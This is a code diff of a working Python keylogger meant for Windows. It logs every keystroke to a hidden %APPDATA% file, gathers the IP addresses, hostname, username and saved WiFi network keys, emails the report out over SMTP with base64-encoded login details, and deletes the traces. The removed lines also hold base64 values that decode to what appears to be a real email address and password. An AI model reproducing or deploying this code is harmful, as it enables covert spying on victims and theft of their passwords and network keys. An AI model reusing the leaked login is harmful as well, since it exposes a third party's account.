@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+
 # -*- coding: utf-8 -*-
 
 
@@ -77,8 +77,8 @@ os_name    = platform.system()
 os_release = platform.release()
                                          
 username = getpass.getuser()  
-if os.path.exists(os.environ["appdata"]+'\\VHost') :    
-         os.remove(os.environ["appdata"]+'\\VHost')
+if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\VHost') :    
+         os.remove(os.environ["appdata"]+'\\FVHost'+'\\VHost')
 else:
      pass
 try:
@@ -144,8 +144,8 @@ print3password      =   'Security key           ..........| '+str(password3)
 print_line          =   '='*40
 print_info          =   'Wifi Info              .........| No WiFi InterFace Found'
 
-if os.path.exists(os.environ["appdata"]+'\\VHost'):
-        os.remove(os.environ["appdata"]+'\\VHost')
+if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\VHost'):
+        os.remove(os.environ["appdata"]+'\\FVHost'+'\\VHost')
 
 list_keys= str([
                 'up','Key.esc','Key.caps_lock','Key.tab','Key.ctrl_r','Key.caps_lock','Key.num_lock',
@@ -192,10 +192,10 @@ class Keylogger:
                 if Key == Key.enter:
                        self.press_Key = "\n"  
                 if Key ==Key.backspace:
-                           with open(os.environ["appdata"]+'\\VHost','r',encoding="utf-8") as log :
+                           with open(os.environ["appdata"]+'\\FVHost'+'\\VHost','r',encoding="utf-8") as log :
                                 log_file=log.read()
                                 log_cut = log_file[0:-1]
-                           with open(os.environ["appdata"]+'\\VHost','w',encoding="utf-8") as log :      
+                           with open(os.environ["appdata"]+'\\FVHost'+'\\VHost','w',encoding="utf-8") as log :      
                                  log_write = log.write(log_cut)
                 if Key ==Key.caps_lock:
                      if not self.caps:
@@ -211,10 +211,10 @@ class Keylogger:
                     if Key == Key.enter:
                        self.press_Key = "\n" 
                   #  if Key ==Key.backspace:
-                  #         with open(os.environ["appdata"]+'\\VHost','r',encoding="utf-8") as log :
+                  #         with open(os.environ["appdata"]+'\FVHost'+'\VHost','r',encoding="utf-8") as log :
                   #              log_file=log.read()
                   #              log_cut = log_file[0:-1]
-                  #         with open(os.environ["appdata"]+'\\VHost','w',encoding="utf-8") as log :      
+                  #         with open(os.environ["appdata"]+'\FVHost'+'\VHost','w',encoding="utf-8") as log :      
                   #               log_write = log.write(log_cut)
                     if Key ==Key.caps_lock:
                         if not self.caps:
@@ -223,11 +223,11 @@ class Keylogger:
                            self.caps = False
              if self.caps :
                     self.ADD_LOG_KEY(self.press_Key.upper())
-                    with open (os.environ["appdata"]+'\\VHost','a',encoding="utf-8")as file0:
+                    with open (os.environ["appdata"]+'\\FVHost'+'\\VHost','a',encoding="utf-8")as file0:
                       file1 =file0.write(self.press_Key.upper())
              else:
                 self.ADD_LOG_KEY(self.press_Key)
-                with open (os.environ["appdata"]+'\\VHost','a',encoding="utf-8")as file0:
+                with open (os.environ["appdata"]+'\\FVHost'+'\\VHost','a',encoding="utf-8")as file0:
                    file1 =file0.write(self.press_Key)
                                       
         def START_SEND_ANDTIME(self):
@@ -238,14 +238,14 @@ class Keylogger:
              self.time_date  = now = datetime.datetime.now()
              self.print_time          =   'Starting Time          ..........| '+str(self.time_date)
              if 'None'in ssid1 and  'None'in password1 and 'None'in ssid2\
-                        and  'None' in password2 and 'None' in  ssid3 and 'None' in password3:
-                            with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
+             and  'None' in password2 and 'None' in  ssid3 and 'None' in password3:
+                            with open (os.environ["appdata"]+'\\FVHost'+'\\VHost','w',encoding="utf-8")as file0:
                                   file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                                   +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_info+'\n'+"="*30\
                                   +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'+self.print_time+'\n'\
                                   +print_line+'\n')
              else:            
-                    with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
+                    with open (os.environ["appdata"]+'\\FVHost'+'\\VHost','w',encoding="utf-8")as file0:
                          file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                          +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_SSID+print_password\
                          +print2SSID+print2password+print3SSID+print3password+"="*30+'\n'+'Keylooger Start'+'\n'+"="*30+'\n'+self.print_time+'\n'\
@@ -261,8 +261,8 @@ class Keylogger:
                       socket_id= socket.gethostname()
                       body =socket.gethostname()+'.txt'.strip()
                       msg.attach(MIMEText(body,'plain'))    
-                      if os.path.exists(os.environ["appdata"]+'\\VHost'):
-                              attachment= open (os.environ["appdata"]+'\\VHost','rb')
+                      if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\VHost'):
+                              attachment= open (os.environ["appdata"]+'\\FVHost'+'\\VHost','rb')
                               filename =body
                               part = MIMEBase('application','octect-stream')
                               part.set_payload((attachment).read())
@@ -278,8 +278,8 @@ class Keylogger:
                               SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8"),base64.b64decode(self.Ecode).decode("utf-8") , text)
                               attachment.close()
                               SERVER.close()
-                      if os.path.exists(os.environ["appdata"]+'\\VHost'):
-                             os.remove(os.environ["appdata"]+'\\VHost')
+                      if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\VHost'):
+                             os.remove(os.environ["appdata"]+'\\FVHost'+'\\VHost')
                       if os.path.exists(os.environ["appdata"]+'\\network'):
                              os.remove(os.environ["appdata"]+'\\network')
             except smtplib.SMTPAuthenticationError:
@@ -304,8 +304,8 @@ class Keylogger:
                   except Exception:
                          pass                        
             import pynput.keyboard    #####    pip install pynput==1.6.8  
-            self.Ecode  = 'cm9vdHgxOTgyQGdtYWlsLmNvbQ=='             # add your email address encode base64
-            self.Scode  = 'cm9vdGFkbWluNg=='             #add your password encode base64 
+            self.Ecode  = 'YWRkeW91ckBnbWFpbC5jb20NCg=='             # add your email address encode base64
+            self.Scode  = 'YWRkeW91ckBnbWFpbC5jb20NCg=='             #add your password encode base64 
             Keyboard_listener = pynput.keyboard.Listener(on_press=self.KEY_PRESS_KEYBOARD)
             with Keyboard_listener:
                 self.START_SEND_ANDTIME()
@@ -314,5 +314,4 @@ class Keylogger:
 if __name__=='__main__':
   
    Keylogger = Keylogger(60) # set the time by seconds
-   Keylogger.GO_START()            
-                        
+   Keylogger.GO_START()          
